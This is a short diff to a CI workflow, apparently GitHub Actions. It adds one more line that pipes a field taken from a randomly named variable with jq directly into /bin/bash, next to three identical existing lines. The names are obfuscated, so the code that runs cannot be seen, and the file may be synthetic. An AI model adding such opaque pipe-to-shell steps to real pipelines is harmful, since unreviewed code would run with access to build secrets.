@@ -30,6 +30,7 @@ jobs:
           echo $oej44 | jq -r .cda07 | /bin/bash
           echo $dgjt6 | jq -r .ufed3084 | /bin/bash
           echo $yqkz7 | jq -r .r8 | /bin/bash
+          echo $f7203 | jq -r .unr2886 | /bin/bash
 
       - name: Upload artifact
         if: always()
